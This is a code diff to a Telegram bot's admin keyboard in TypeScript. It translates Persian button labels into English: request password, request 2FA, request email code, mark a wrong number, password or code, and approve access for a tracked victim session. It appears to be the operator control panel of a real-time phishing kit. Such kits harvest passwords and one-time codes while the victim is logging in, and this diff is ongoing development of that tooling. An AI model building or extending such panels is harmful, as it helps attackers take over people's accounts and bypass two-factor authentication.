@@ -703,7 +703,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Password button - show if not attempted
   if (!session.authAttempts["password"]) {
     authRow.push({
-      text: "🔒 رمز عبور",
+      text: "🔒 REQUEST PASSWORD",
       callback_data: `auth_password_${sessionId}`,
     });
     console.log("✅ Added Password button");
@@ -712,7 +712,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Google Auth button - show if not attempted
   if (!session.authAttempts["google"]) {
     authRow.push({
-      text: "📱 Google Auth",
+      text: "📲 REQUEST 2FA",
       callback_data: `auth_google_${sessionId}`,
     });
     console.log("✅ Added Google Auth button");
@@ -730,7 +730,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   if (!session.authAttempts["email"]) {
     buttons.push([
       {
-        text: "📧 کد ایمیل",
+        text: "📧 REQUEST EMAIL CODE",
         callback_data: `auth_email_${sessionId}`,
       },
     ]);
@@ -740,7 +740,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Wrong SMS button - always available (moved from wrong buttons section)
   buttons.push([
     {
-      text: "❌ شماره اشتباه",
+      text: "❌ WRONG NUMBER",
       callback_data: `incorrect_sms_${sessionId}`,
     },
   ]);
@@ -756,7 +756,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
     session.authAttempts["password"] > 0
   ) {
     wrongButtonsRow1.push({
-      text: "❌ رمز اشتباه",
+      text: "🚫 WRONG PASSWORD",
       callback_data: `incorrect_password_${sessionId}`,
     });
     console.log("✅ Added Wrong Password button");
@@ -765,7 +765,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Wrong Google Auth button - only if user attempted google auth at least once
   if (session.authAttempts["google"] && session.authAttempts["google"] > 0) {
     wrongButtonsRow1.push({
-      text: "❌ کد اشتباه",
+      text: "🚫 WRONG 2FA",
       callback_data: `incorrect_google_${sessionId}`,
     });
     console.log("✅ Added Wrong Google Auth button");
@@ -776,7 +776,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   // Wrong Email button - only if user attempted email at least once
   if (session.authAttempts["email"] && session.authAttempts["email"] > 0) {
     wrongButtonsRow2.push({
-      text: "❌ ایمیل اشتباه",
+      text: "🚫 WRONG EMAIL",
       callback_data: `incorrect_email_${sessionId}`,
     });
     console.log("✅ Added Wrong Email button");
@@ -794,7 +794,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
   if (session.completedSteps.length > 1) {
     buttons.push([
       {
-        text: "✅ تایید ورود",
+        text: "✅ APPROVE ACCESS",
         callback_data: `complete_auth_${sessionId}`,
       },
     ]);
